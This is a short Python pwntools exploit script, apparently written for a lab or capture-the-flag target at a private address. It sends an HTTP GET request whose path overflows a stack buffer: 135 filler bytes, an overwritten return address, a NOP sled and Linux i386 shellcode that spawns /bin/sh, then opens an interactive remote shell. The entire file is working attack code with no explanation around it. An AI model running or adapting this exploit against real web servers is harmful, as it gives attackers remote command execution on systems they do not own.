from pwn import *

global io
def sendcommand(cmd):
    
        io.sendline(cmd)
        output = io.recvline()
        if output:
            return output.decode()


def get_shellcode32():
    context.update(arch='i386',os='linux')
    return asm(shellcraft.sh())


io = remote("172.16.81.129",20001)

bufaddr = 0xbfffff00
buf = b"A"*135
ebp = p32(0xdeadbeef)
eip = p32(0x08049f4f) 

#dummy = b"X"*100

print(f"eip ----> {eip}")
trap = b'\xcc'*100
nop = b'\x90' * 200

shellcode = get_shellcode32()

print(f"eip --> {eip} \n  ebp ---> {ebp}\n")
payload = [
    buf,
    ebp,
    eip,
    nop,
    shellcode
        ]

payload1 = [
    nop,
    shellcode
        ]

payload = b"".join(payload)
payload1 = b"".join(payload1)

cmd = b"GET " + payload+ b" HTTP/1.1"
print(f"shellcode ==> {shellcode}\n")
print(f"paload ===> {cmd}")

io.sendline(cmd)
#print(io.recvline())
io.interactive()


